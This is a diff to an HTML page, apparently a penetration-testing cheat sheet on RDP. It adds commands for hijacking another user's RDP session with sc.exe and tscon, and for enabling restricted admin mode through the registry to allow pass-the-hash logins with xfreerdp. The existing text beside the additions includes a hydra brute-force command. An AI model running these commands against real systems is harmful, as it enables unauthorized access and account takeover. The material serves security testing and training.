@@ -78,6 +78,24 @@ xfreerdp /u:&lt;username&gt; /p:&lt;password&gt; /v:&lt;IP address&gt; /cert:ign
 
 <span class="c"># execute a password attack with hydra</span>
 hydra <span class="nt">-V</span> <span class="nt">-L</span> &lt;username list&gt; <span class="nt">-P</span> &lt;password list&gt; rdp://&lt;IP address&gt;
+
+<span class="c"># on windows, query users with active RDP sessions</span>
+query user
+
+<span class="c"># on windows with sc.exe, create a service to hijack a RDP session</span>
+sc.exe create &lt;service name&gt; <span class="nv">binpath</span><span class="o">=</span> <span class="s2">"cmd.exe /k tscon &lt;session ID&gt; /dest:&lt;session name&gt;"</span>
+
+<span class="c"># then, start the service and hijack the session</span>
+net start &lt;service name&gt;
+
+<span class="c"># on windows, add a registry key that enables</span>
+<span class="c"># restricted admin mode. this allows us to</span>
+<span class="c"># perform a pass the hash attack to connect</span>
+<span class="c"># with RDP</span>
+reg add HKLM<span class="se">\S</span>ystem<span class="se">\C</span>urrentControlSet<span class="se">\C</span>ontrol<span class="se">\L</span>sa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+
+<span class="c"># then, use xfreerdp to pass the hash and connect</span>
+xfreerdp /v:&lt;IP address&gt; /u:&lt;username&gt; /pth:&lt;<span class="nb">hash</span><span class="o">&gt;</span>
 </code></pre></div>
 
     </main>
